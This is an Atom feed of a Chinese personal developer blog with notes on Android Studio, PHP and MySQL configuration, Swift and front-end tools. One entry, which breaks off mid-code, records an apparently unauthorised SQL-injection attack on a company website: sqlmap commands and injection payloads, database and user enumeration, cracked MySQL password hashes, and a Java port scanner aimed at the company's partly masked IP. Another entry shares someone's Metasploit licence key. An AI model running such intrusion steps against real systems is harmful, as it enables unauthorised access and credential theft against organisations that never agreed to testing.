<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[K]]></title>
  <link href="http://mzkmzk.github.io/atom.xml" rel="self"/>
  <link href="http://mzkmzk.github.io/"/>
  <updated>2015-09-09T16:41:24+08:00</updated>
  <id>http://mzkmzk.github.io/</id>
  <author>
    <name><![CDATA[K]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[AndroidStudio技巧]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/09/07/AS_kill/"/>
    <updated>2015-09-07T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/09/07/AS_kill</id>
    <content type="html"><![CDATA[<h3>0x00 AS的提示总结</h3>

<ol>
<li><code>command+O</code>:显示当前文件所有函数</li>
<li><code>command+I</code>:显示接口文件的所有函数</li>
<li><code>ctrl+option+space</code>:补全提示</li>
<li><code>command+N</code>:一些可以自动生成的代码例如get,set</li>
<li><code>command+option+W</code>:可以快速定位视图</li>
<li><code>command+option+Z</code>:选择使用快速生成ifelse/Runable等代码</li>
<li><code>control+option+上/下</code>:搜索选定单词的下个位置</li>
<li><code>control+shift+/</code>:多行注释</li>
<li><code>control+Q</code>:返回上一个修改的光标处</li>
<li><code>command+E</code>:选择文件</li>
<li><code>control+shitf+J</code>:两行合为一行</li>
<li><code>commnad+option+V</code>:移动当前文件之&hellip;</li>
<li><code>command+option+O</code>:搜索特定的方法</li>
<li><code>control+'(1旁边)</code>:切换变成模式</li>
<li><code>command+3</code>:查找制定action</li>
<li><code>command+1</code>:fix action</li>
<li><code>control+h</code>:全局搜索</li>
<li><code>command+shitf+T</code>搜索class</li>
<li><code>command+shitf+G</code></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php_配置记录错误文件]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/09/06/php_error_log/"/>
    <updated>2015-09-06T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/09/06/php_error_log</id>
    <content type="html"><![CDATA[<h3>0x00 配置php.ini</h3>

<p>php.ini中设置</p>

<pre><code>log_errors = On
error_log = /var/log/php_errors.log
</code></pre>

<p>重启服务器 Mac:<code>sudo /usr/sbin/apachectl restart</code></p>

<h3>添加错误文件</h3>

<p>这个非常重要.由于当时我添加文件写错了名字&hellip;导致耽误了很多时间..吐槽一下..php不能自己自动添加文件吗?权限问题?不应该</p>

<p>安装error_log添加文件然后给权限777就行.</p>

<h3>其他参考</h3>

<p>错误级别error_reporting设置<a href="http://www.vfeelit.com/232.html">http://www.vfeelit.com/232.html</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mac 配置mysql配置文件]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/09/06/mac_mysql_cnf/"/>
    <updated>2015-09-06T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/09/06/mac_mysql_cnf</id>
    <content type="html"><![CDATA[<h3>0x00 copy my.cnf</h3>

<p>Mac默认没有这个文件.用系统默认的配置</p>

<p>要想更改的话</p>

<pre><code>cd /usr/local/mysql/support-files/
</code></pre>

<p>在此文件夹里面任意复制一个.cnf到/etc下也就行</p>

<h3>各种小配置</h3>

<ol>
<li><p>设置记录sql文件</p>

<pre><code> [mysqld]段内增加
 //记录使用过的预计
 general_log = 1
 general_log_file = 文件路径

 //另外命令也可开关.不过应该是临时的
 SET GLOBAL general_log = 'ON';
 SET GLOBAL general_log = 'OFF';

 //并不知道有神马用
 slow_query_log = 1 

 //系统报错文件
  /usr/local/mysql/data/K.local.err  

  log_bin= /var/log/mysql/mysql-bin.log
</code></pre>

<p> 参考链接<a href="http://hessian.cn/p/1018.html">http://hessian.cn/p/1018.html</a></p></li>
<li><p>限定访问ip</p>

<pre><code> //若想其他机器能登录,注释掉此句
 #bind-address           = 127.0.0.1
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php_selenium入门]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/09/05/php_selenium/"/>
    <updated>2015-09-05T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/09/05/php_selenium</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[node入门]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/08/15/node_js_start/"/>
    <updated>2015-08-15T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/08/15/node_js_start</id>
    <content type="html"><![CDATA[<h3>下载安装包</h3>

<p><a href="https://nodejs.org/download/">https://nodejs.org/download/</a></p>

<p>安装完成后的信息</p>

<pre><code>Node was installed at

/usr/local/bin/node

npm was installed at

/usr/local/bin/npm

Make sure that /usr/local/bin is in your $PATH.
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[设计参考模板]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/08/11/Design/"/>
    <updated>2015-08-11T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/08/11/Design</id>
    <content type="html"><![CDATA[<h3>Web</h3>

<p>后台<a href="http://www.templatemo.com/live/templatemo_455_visual_admin">http://www.templatemo.com/live/templatemo_455_visual_admin</a></p>

<p>APP
<a href="http://www.invisionapp.com/do">http://www.invisionapp.com/do</a></p>

<p>后台
<a href="https://creativemarket.com/Endless/16193-Perfect-Admin">https://creativemarket.com/Endless/16193-Perfect-Admin</a></p>

<p>UI<a href="http://www.ui.cn/">http://www.ui.cn/</a></p>

<p>站酷<a href="http://www.zcool.com.cn/">http://www.zcool.com.cn/</a></p>

<p>洛可可
<a href="http://www.lkkdesign.com/">http://www.lkkdesign.com/</a></p>

<p><a href="https://dribbble.com/">https://dribbble.com/</a></p>

<p>后台模板
<a href="http://optimisticdesigns.herokuapp.com/landerv2/html/form-wizard.html">http://optimisticdesigns.herokuapp.com/landerv2/html/form-wizard.html</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[html 使用积累]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/08/07/html_%20accumulated/"/>
    <updated>2015-08-07T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/08/07/html_ accumulated</id>
    <content type="html"><![CDATA[<p>隐藏html</p>

<ol>
<li>display:none|block; 隐藏不占据空间.</li>
<li>visibility：hidden|visible; 隐藏仍占据空间;</li>
</ol>


<h3>css3 html支持浏览器程度查询</h3>

<p><a href="http://caniuse.com/">http://caniuse.com/</a></p>

<h3>css@import和link的区别</h3>

<p><a href="http://www.dreamdu.com/blog/2007/05/11/css_link_import/">http://www.dreamdu.com/blog/2007/05/11/css_link_import/</a></p>

<h3>好用的框架</h3>

<p>类似于alert的作用,但是用户无需点击它,它会自动显示在右下角,用户体验棒很多<a href="http://github.hubspot.com/messenger/docs/welcome/">http://github.hubspot.com/messenger/docs/welcome/</a></p>

<p>bootcdn<a href="http://www.bootcdn.cn/">http://www.bootcdn.cn/</a>各大框架的各版本链接</p>

<h3>待消化框架</h3>

<p>做动画效果的<a href="http://tumult.com/hype/">http://tumult.com/hype/</a></p>

<h3>零散知识点</h3>

<ol>
<li><code>&lt;code&gt;</code>标签通常只是把文本变成等宽字体,但它暗示着这段文本是源程序代码.</li>
<li><code>&lt;th scope="col|row|colgroup|rowgroup"&gt;</code>对普通浏览器无作用,但是被作为阅读器理解为头部.</li>
<li><p><code>vertical-align</code>可能的值:</p>

<p> 3.1 <code>baseline</code>元素放置在父元素基线上</p>

<p> 3.2 <code>sub</code>垂直对齐文本下标</p>

<p> 3.3 <code>super</code>垂直对齐文本上标</p>

<p> 3.4 <code>%</code>使用line-height属性的百分比值来排列元素,允许使用负值</p>

<p> 3.5 <code>inherit</code>从父类继承</p>

<p> 3.5 其余:top,text-top,middle,buttom,text-bottom,length</p></li>
</ol>


<p>4.<code>float</code>使用后magin 0 auto会失去作用,因为float的布局会移出文档流.</p>

<h3>Bootstrap 理解</h3>

<ol>
<li><code>.col-xs-12 .col-sm-6 .col-md-8</code>表示 当屏幕小于768时,按xs走,屏幕分辨率在768-996时按sm走,大于996后按md走</li>
<li>使用表格样式<code>.table</code>,<code>.table-striped</code>斑马线样式,<code>.table-bordered</code>带边框,<code>.table-hover</code>悬停样式,<code>table-condensed</code>紧凑,<code>table-responsive</code>滚动条响应式</li>
</ol>


<h3>控件状态</h3>

<p>以a标签为例</p>

<pre><code>a:link {color: #FF0000} /* 未访问的链接 */
a:visited {color: #00FF00} /* 已访问的链接 */
a:hover {color: #FF00FF} /* 鼠标移动到链接上 */
a:active {color: #0000FF} /* 选定的链接 */
</code></pre>

<h3>规范性</h3>

<p>1.标签中的的顺序</p>

<pre><code>class
id, name
data-*
src, for, type, href
title, alt
aria-*, role    
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[react入门]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/29/Axure_start/"/>
    <updated>2015-07-29T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/29/Axure_start</id>
    <content type="html"><![CDATA[<!--more-->


<p><a href="http://www.douban.com/group/topic/39697467/">http://www.douban.com/group/topic/39697467/</a>
<a href="http://blog.sina.com.cn/s/blog_7256fe8f0101b29t.html">http://blog.sina.com.cn/s/blog_7256fe8f0101b29t.html</a></p>

<p>侧滑和弹窗效果实现记录</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HaploX Web Bug制作过程]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/27/Haplox_APP_start/"/>
    <updated>2015-07-27T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/27/Haplox_APP_start</id>
    <content type="html"><![CDATA[<h3>0x00 Web Bug</h3>

<ol>
<li>用户登录时间不对</li>
<li>管理用户和用户列表是一样的- -?.</li>
<li>数据库级联删除 - 目测是执行多个sql而非设置数据库表关系</li>
<li>权限限制为空</li>
<li><a href="http://192.168.0.20:8080/lab/backend-zh/patient/addPatient.php">http://192.168.0.20:8080/lab/backend-zh/patient/addPatient.php</a>必填UI错位</li>
<li>添加病人时,性别为何要Unknow</li>
<li>添加病人时显示错误:机构名称错误，无法找到有效编码！！！主诉疾病名称错误，无法找到有效编码！！！,不友好 又要全部重新填过,建议Ajax及时校验</li>
<li>病人列表 选择排序时,下拉贴表超出去了</li>
<li>建议新增病人时,机构名称为下拉列表,</li>
<li>新增病人的时候啊.什么是机构分配
编码,是新增机构时我填写的编码吗.</li>
<li>第三次添加病人.显示错误:主诉疾病名称错误，无法找到有效编码！！！</li>
<li>终于成功添加病人了&hellip;添加病人中的主诉疾病还是下拉列表比较好</li>
<li>病人添加病历还得重新填姓名?????????????????????????id级联不行?</li>
<li>疑问:新增病历时:能否重复提交同一种主诉疾病</li>
<li>新增病历的病历图片居然是一个文本框?</li>
<li>添加病历显示:病人/样本不存在！！！&hellip;.</li>
<li>修改病人资料:必填项不可为空！！！但是星星只标了头三项不能为空</li>
<li>新增病历要求病人名称不能为空,但是新增病人时病人名字可以为空</li>
<li>修改病人资料时,全部资料写完了 但是还是显示必填项不能为空</li>
<li>感觉web导航栏和左部重复</li>
<li>新增DNA信息生成编码时为乱码:����-150727001和处理时间错位</li>
<li>页面统一字符,能用中文都用中文,别中英参杂</li>
<li><p>数据库多余字段</p>

<pre><code>patient_medical_record表
1. title
2. detail
3. major_disease
</code></pre></li>
</ol>


<h3>0x00 APP构架思路</h3>

<p>疑问:报告生成的根据属性</p>

<h3>0X01 编写list_View页面思路</h3>

<ol>
<li>编写布局文件</li>
<li>编写Bean 了解清楚显示属性</li>
<li>编写Adapter</li>
<li>编写Handler</li>
<li>编写Thread</li>
<li>编写Activity</li>
</ol>


<h3>0x02 APP图片地址</h3>

<p>index</p>

<p>病人管理<a href="https://www.iconfinder.com/icons/313530/aid_cure_medical_patient_surgery_surgical_icon#size=128">https://www.iconfinder.com/icons/313530/aid_cure_medical_patient_surgery_surgical_icon#size=128</a></p>

<p>样本管理<a href="https://www.iconfinder.com/icons/227904/color_drip_dropper_sample_icon#size=128">https://www.iconfinder.com/icons/227904/color_drip_dropper_sample_icon#size=128</a></p>

<p>DNA管理<a href="https://www.iconfinder.com/icons/368106/biology_dna_icon#size=128">https://www.iconfinder.com/icons/368106/biology_dna_icon#size=128</a></p>

<p>DNA文库<a href="https://www.iconfinder.com/icons/278716/dna_genious_icon#size=128">https://www.iconfinder.com/icons/278716/dna_genious_icon#size=128</a></p>

<p>上机管理<a href="https://www.iconfinder.com/icons/363302/computer_glasses_woman_icon#size=128">https://www.iconfinder.com/icons/363302/computer_glasses_woman_icon#size=128</a></p>

<p>测序管理<a href="https://www.iconfinder.com/icons/391688/filter_list_order_outline_sequence_sort_sorting_icon#size=128">https://www.iconfinder.com/icons/391688/filter_list_order_outline_sequence_sort_sorting_icon#size=128</a></p>

<h3>0x03 APP疑问</h3>

<ol>
<li>样本列表中病人和取样者的区别</li>
<li>样本和DNA的关系</li>
</ol>


<h3>0x04 遗留问题</h3>

<ol>
<li><p>index中6个图片要制作成.9.png不然每个屏幕显示不一样.</p></li>
<li><p>首页中轮播图有两个onclick时间不知道是干哈的- -. 发现2个是一样的 就删了一个</p></li>
</ol>


<h3>0x05 总结</h3>

<ol>
<li>命名 文件夹首字母大写</li>
<li>命令 文件夹 功能跳转 以跳转为头,若镶嵌 则功能为头</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[react入门]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/20/react_start/"/>
    <updated>2015-07-20T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/20/react_start</id>
    <content type="html"><![CDATA[<!--more-->


<h3>开始安装使用react</h3>

<p>下载地址<a href="http://facebook.github.io/react/docs/getting-started.html">http://facebook.github.io/react/docs/getting-started.html</a></p>

<p>尝试下载安装包种examaple</p>

<p>先安装node.js</p>

<ol>
<li><p>examples/basic-jsx-precompile/</p>

<pre><code> npm install -g react-tools
 cd examples/basic-jsx-precompile/
 jsx . build/
</code></pre></li>
</ol>


<h3>参考资料</h3>

<p>react-native 之布局篇<a href="https://github.com/tmallfe/tmallfe.github.io/issues/19">https://github.com/tmallfe/tmallfe.github.io/issues/19</a></p>

<p>react开发者演讲<a href="https://code.facebook.com/posts/1014532261909640/react-native-bringing-modern-web-techniques-to-mobile/">https://code.facebook.com/posts/1014532261909640/react-native-bringing-modern-web-techniques-to-mobile/</a></p>

<p>react示例阅读<a href="http://www.infoq.com/cn/articles/subversion-front-end-ui-development-framework-react">http://www.infoq.com/cn/articles/subversion-front-end-ui-development-framework-react</a></p>

<p>API<a href="http://facebook.github.io/react-native/docs/troubleshooting.html#content">http://facebook.github.io/react-native/docs/troubleshooting.html#content</a></p>

<p>在线开发环境<a href="https://jsfiddle.net/reactjs/69z2wepo/">https://jsfiddle.net/reactjs/69z2wepo/</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iOS 入门常见问题]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/20/iOS_Start/"/>
    <updated>2015-07-20T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/20/iOS_Start</id>
    <content type="html"><![CDATA[<h3>1. Device os version lower than deployment target</h3>

<p>我把手机连接电脑后,准备跑项目,但是Xcode提醒<code>Device os version lower than deployment target</code></p>

<p>原因是项目要求最低版本高于手机版本,单击项目修改D<code>eployment Target即可</code></p>

<p>API<a href="https://developer.apple.com/library/ios/navigation/">https://developer.apple.com/library/ios/navigation/</a></p>

<p>学习视频<a href="http://open.163.com/special/opencourse/ios8.html">http://open.163.com/special/opencourse/ios8.html</a></p>

<h4>/Users/maizhikun/Learning/iOS/workspace/Calculatoer/Calculatoer/CalculatorBrain.swift:12:22: &lsquo;Printable&rsquo; has been renamed to &lsquo;CustomStringConvertible&rsquo;</h4>

<p> enum Op: Printable改成</p>

<p> enum Op: CustomStringConvertible</p>

<h3>书籍</h3>

<p> <a href="http://www.zhihu.com/question/24004342">http://www.zhihu.com/question/24004342</a></p>

<h3>学习博客</h3>

<p> <a href="http://blog.csdn.net/Yt7589#rd?sukey=fc78a68049a14bb282a9238cb43355c93c53ed2c5959342e3c9a2d814b2888b1f46e19db83593016565093d093f7aff4">http://blog.csdn.net/Yt7589#rd?sukey=fc78a68049a14bb282a9238cb43355c93c53ed2c5959342e3c9a2d814b2888b1f46e19db83593016565093d093f7aff4</a></p>

<h2>白胡子教程笔记</h2>

<h4>第四课Swift和Foundation框架</h4>

<ol>
<li><p>数组</p>

<pre><code> var a = Arry&lt;String&gt;()

 var a = [String]()

 var animals = ["Giraffe","Cow"]

 animals.append("Dog");

 let animal = animals[1]

 for animals in animals {
     println("\(animal)")
 }
</code></pre></li>
<li><p>Dictonary</p>

<pre><code> var pac10teamRankings = Dictionary&lt;String, Int&gt;()

 var pac10teamRankings = [String:Int]()

 pac10teamRankings = ["Stanford":1,"Cal":10]

 let ranking = pac10teamRankings["Ohin State"] //return nil

 for (key , value ) in pack10teamRankings {
     println("\(key) = \(value)")
 }
</code></pre></li>
<li><p>Rabge</p>

<pre><code> struct Range&lt;T&gt;{
     var startIndex :T
     var endIndex: T
 }       
</code></pre>

<p> An Array&rsquo;s range would be a Range<Int></p>

<p> Warning: A String subrange is not Range<Int>(it is Range&lt;String.Index> &hellip; we&rsquo;ll talk later!)</p>

<p> There is special syntax for specifying a Range: either &hellip;(ubclusive) or ..&lt;(open-ended)</p>

<pre><code> let array =["a","b","c","d"]

 let subArray1 = array[2...3] //return ["c","d"]

 let subArray2 = array[2..&lt;3] // return ["c"]

 for i in [27...104]{
 }
</code></pre></li>
<li><p>其他数据类型</p>

<pre><code> NSObject
 NSNumber
 NSDate
 NSData
</code></pre></li>
<li><p>数据类型</p>

<pre><code> //声明
 class CalculatorBrain { }

 struct Vertex  {}

 enum Op {}

 //函数

 func doit(argument: Type) -&gt; ReturnValue{}

 var storedProperty =&lt;initial value&gt;(not enum)

 var computerProperty: Type{
     get {}
     set {}
 }

 //构造函数
 init(argument1: Type, argument2: Typ2, ...){} 
</code></pre>

 三者不同点:

<ol>
<li>Inheritance(class only)</li>
<li>Introspection and castring(class only)</li>
<li>Value type(struct,enum) vs. Referenct type(class)</li>
</ol>
</li>
<li><p>Value vs. Referenct</p>

<p> Value:</p>

<p> You must note any func that can mutate a struct/enum with the keyword <code>mutaint</code></p>

<p> Referenct :</p></li>
<li><p>Methods</p>

<p> 重写父类方法/属性时,要使用<code>override</code></p>

<p> <code>final</code> 标记不能被重写的方法和属性</p>

<pre><code> var d: Double =...

 if d.isSignMinus {
     d =Double.abs(d)
 }

 static func abs(d: Double) -&gt; Double{}


 //Parameter Names 
 1.
 func foo(external internal: Int){
     let local = internal
 }

 func bar() {
     let result = foo(external: 123)
 }

 2.我部想拥有一个外部名
 func foo(_ internal: Int){
     let local = internal
 }

 func bar(){
     let result = foo(123)
 }

 3. 必须要外部名
 func foo(#internal: Int){
     let local = internal
 }

 func bar(){
     let result = foo(internal: 123)
 }

 4.
 func foo(first: Int, second: Double){
     let local =internal
 }

 func bar(){
     let result = foo(123, second 5.5)
 }

 5. 
 fimc fpp(first: Int, externalSecond second: Double){
     let local =internal //?这是不是错了?
 }

 func bar(){
     let result = foo(123, externalSecond: 5.5)
 }

 6. 
 func foo(first: Int, _ second: Double){
     let local = internal 
 }

 func bar(){
     let result =foo(123,5.5)
 }
</code></pre></li>
<li><p>Properties</p>

<pre><code> var someStoredProperty: Int =42{
     willset { newValue is the new value }
     didSet {oldValue is the old value }
 }

  var inheritedProperty {
     willSet { newValue is the new value}
     didSet { oldValue is the old value}
 }
</code></pre>

<p> Lazy Initialization (惰性实例化)</p>

<p> 只有var 可以用lazy ,let不可以</p>

<pre><code> lazy var brain = Calculator Brain()

 lazy var someProperty: Type =  {
     return &lt;the constructed value &gt;
 }

 lazy var myProperty =self.initializeMyProperty()
</code></pre></li>
<li><p>Initialization</p>

<p> lazy 或者其他很多方法可以避免initiative</p>

<pre><code> selfinit(&lt;args&gt;)

 super.init(&lt;args&gt;)
</code></pre>

 两种构造方法

<pre><code> 1. Convenience Init
     1. 只能调用本类的designated initializer
     2. 只能通过本类的designated intializer才能访问其他的值
 2. Designated Initalizers(default)
     1. 之前不能有Convenience Init
     2. 只能调用其父类的Designated initializer
     3. 调用父类的Init前,先初始化所有的property
     4. 必须先让父类初始化property才能给子类调用
</code></pre>

<p> 子类没写designated init则继承父类所有的designated init和Converienct init,否则不继承父类的所有designated init</p>

<p> required init 子类必须实现这个方法</p>

<pre><code> init?(arg1: Type1, ...){}

 let image = UIImage(named: "foo")

 if let image = UIImage(named: "foo"){
     successfully 
 }else {
     faled
 }

 let commaSeparatedArrayElements: String = ",".join(myArray)
</code></pre></li>
<li><p>AnyObject</p>

<p>主要用来兼用现有的Object-C和iOS代码</p>

<pre><code>var destinationViewController: AnyObject
var toolbarItems: [AndObject]

func prepareForSegue(segue: UIStoryboardSegue, sender: AnyObject)
func appConstraints(constraints: [AnyObject])
func appendDigit(sender: AnyObject)

class func buttonWithType(buttonType: UIButtonType) -&gt; AnyObject

let calcVC = destinationViewController as CalculatorViewController 

if let calcVC = destinationViewController as? CalculatorViewController {...}

---

var toolbarItems: [AnyObject]

for item in toolbarItems {
    if let toolbarItem = item as? UIBarButtonItem{

    }
}

for toolbarItem in toolbarItems as [UIBarButtonItem] {
    //不能使用as? 因为for toolbarItem in nil是无意义的
}

---

let button: AnyObject =UIButton.buttonWithType(UIButtonType.System)

let tutle = (button as UIButton).currentTitle
</code></pre></li>
</ol>


<p>11 Function</p>

<pre><code>//Some Array&lt;T&gt; Methods
+=[T] //not +=T 

var a = [a,b,c]

append(T)

insert(T, atIndex : Int)

splice(Array&lt;T&gt;,atIndex: Int)   a.splice([d,e], atIndex:1),a = [a,d,e,b,c]

removeAtIndex(Int)

removeRange(Range) a.removeRange(0..&lt;2) a = [c]

replaceRange(Range, [T]) //a.replaceRange(0...1 with: [x,y,z]),a= [x,y,z,b]

sort(isOrderedBefore : (T,T)) -&gt; Bool) //e.g a.sort($$0 &lt;$1)

filter(includeElement: (T) -&gt; Bool) -&gt; [T]

let stringified: [String] = [1,2,3].map{ "\($0)"}

let sum: Int = [1,2,3].reduce(0) {$0 + $1}

//String

var s = "hello"

let index = advance(s.startIndex,2) //return  l

s.splice("abc",index) // return heabcllo

let startIndex =advance(s.startIndex,1)

let endIndex = advance(s.startIndex,6)

let substring = s[index..&lt;endIndex] // return eabcl

//String.Index

let num = "56.25"

if let decimalRange = num.rangeOfString("."){
    let wholeNumberPart = num[num.startIndex..&lt;decimalRange.startIndex]
}

s.removeRange([s.startIndex..&lt;decimalRange.startIndex])

//Other String Methods

description -&gt;String //Printable

endIndex -&gt; String.Index

hasPrefix(String)) -&gt; Bool

hasSuffix(String) -&gt; Bool

toInt -&gt; Int?  //not toDouble

capitalizedString -&gt; String 

lowercaseString -&gt; String

uppercaseString -&gt; String 

join(Array) -&gt; String // ",".join(]"1","2",3""]) = "1,2,3"

componentsSeparatedByString(Strign ) -&gt; [String] // "1,2,3".csbs(",") = ["1","2","3"]

//Type Conversion

let d: Double =37.5

let f: Falot = 37.5

let x = Int(d)

let xd = Double(x)

let cgf =CgFloat(d)

let a = Array("abc")  // a = ["a","b","c"]

let s = String(["a","b","c"]) // return s = "abc"

let s = String(52)

let s= "\(37.5)"

//Assertions 

assert(() -&gt; Bpp; ,"message")

e.g: assert(validation() !=nil,"the validation function returned nil")

//Other Functions 

let count = countElements(aCollection) //how many elements in the collection

let sub = dropFirst(aSliceable) //drops the first thing in the sliceable

let sub dropLast(aSliceable) // drops the last thing in the sliceable

let first = first(aCollection) 

let last = last(aCollection)

let prefix = prefix(aSliceable, X:Int)

let suffix = suffix(aSliceable, X: Int)

let reversed: Array = reverse(aCollection)

let backwardsSTRING = String(reverse(s))
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[grunt入门]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/20/grunt_start/"/>
    <updated>2015-07-20T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/20/grunt_start</id>
    <content type="html"><![CDATA[<h3>安装步骤</h3>

<ol>
<li>先安装node.js</li>
<li>输入命令行<code>sudo npm install -g grunt-cli</code></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[metasploit 安装]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/19/metasploit_install/"/>
    <updated>2015-07-19T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/19/metasploit_install</id>
    <content type="html"><![CDATA[<!--more-->


<p>注意点</p>

<ol>
<li>一定要注意教程的最低配置设定</li>
<li>安装到最后会有个获取验证码..我试过qq、新浪和gmail都无法获取验证码,听说一定要企业邮箱 例如139(我还没尝试),别人给的我一个使用吗QWYW-M386-29JQ-PHMW</li>
</ol>


<h3>0x00下载地址</h3>

<p><a href="http://www.rapid7.com/products/metasploit/download.jsp">http://www.rapid7.com/products/metasploit/download.jsp</a></p>

<h3>0x01 教程下载地址</h3>

<p><a href="https://community.rapid7.com/docs/DOC-2100">https://community.rapid7.com/docs/DOC-2100</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sqlmap 渗透某集团]]></title>
    <link href="http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw/"/>
    <updated>2015-07-18T11:37:40+08:00</updated>
    <id>http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw</id>
    <content type="html"><![CDATA[<!--more-->


<h3>0x00 找到盲注点</h3>

<p>参考链接<a href="http://bluereader.org/article/59585524">http://bluereader.org/article/59585524</a></p>

<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dbs

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: fax_id (GET)
Type: UNION query
Title: MySQL UNION query (NULL) - 4 columns
Payload: fax_id=1' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x72514471566c4b56546f,0x71706a7871),NULL,NULL#

Type: AND/OR time-based blind
Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
Payload: fax_id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))dCsX) AND 'uYLq'='uYLq
---

available databases [3]:                                                       
[*] information_schema
[*] mysql
[*] mysql3235
</code></pre>

<h3>0x01 查看数据库表和数据</h3>

<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --tables
</code></pre>

<p>就会得到数据库中的所有表,然后我随即抽了一个schedule表查看数据</p>

<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dump -T schedule
</code></pre>

<p>但是结果不如人意</p>

<pre><code>[13:27:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)

Database: mysql3235
Table: schedule
[0 entries]
+-------+---------+-----------+
| TITLE | ENDTIME | STARTTIME |
+-------+---------+-----------+
+-------+---------+-----------+
</code></pre>

<h3>0x02 尝试爆破数据库密码</h3>

<p>获取数据库用户</p>

<pre><code> python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users

database management system users [5]:                                          
[*] ''@'localhost'
[*] 'cubetech'@'localhost'
[*] 'debugger'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'localhost'
</code></pre>

<p>获取数据库密码</p>

<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users --passwords

database management system users password hashes:                              
[*] cubetech [1]:
password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
clear-text password: 123456
[*] debugger [1]:
password hash: *6D45DF82DF6169868F43DD422AB3229D376BD1BE
clear-text password: debugger
[*] root [1]:
password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
</code></pre>

<h3>0x03 探索Mysql端口</h3>

<p>知道了数据库用户名和端口后 我就尝试远程链接数据库了.ip很容易得到. 应该是服务器本身 .这样的服务器管理员应该是不会做服务器和数据库分离的 .</p>

<p>尝试了mysql的3306端口 失败!</p>

<p>写了个java扫描哪些端口开启&hellip;</p>

<pre><code>import java.net.Socket;

import java.util.ArrayList;
import java.util.List;


public class Check_Open_Port {
public static void main(String args[]) {
    final List&lt;Integer&gt; li = new ArrayList&lt;Integer&gt;();
    for (int i = 0; i &lt;= 65535; i++) {
        li.add(i);
    }

    for (int i = 0; i &lt;= 100; i++) {
        new Thread() {
            public void run() {
                while (li.size() != 0) {
                    int li_get = 0;
                    int num = (int) Math.floor(Math.random()* (li.size()));
                    try {
                        li_get = li.get(num);
                        int num_remove_check =li.indexOf(li_get);
                        if(num_remove_check!=-1)
                        li.remove(num_remove_check);
                        Socket client = new Socket("122.233.243.***",
                                li_get);
                        System.out.println("端口 : " + li_get + "已开放");
                        client.close();
                    } catch (Exception e) {
                        System.out.println("端口 : " + li_get + "未开放");
                    }
                }
            }
        }.start();
    }
    //检测ip有无被封锁 和当前集合个数
    new Thread() {
        public void run() {
            while (li.size() != 0) {
                try {
                    Socket client = new Socket("122.233.243.***", 80);
                    System.out.println("端口 : " + 80 + "已开放");
                    client.close();

                } catch (Exception e) {
                    System.out.println("端口 : " + 80 + "未开放");
                }
                System.out.println("当前集合个数 : "+li.size());
                try {
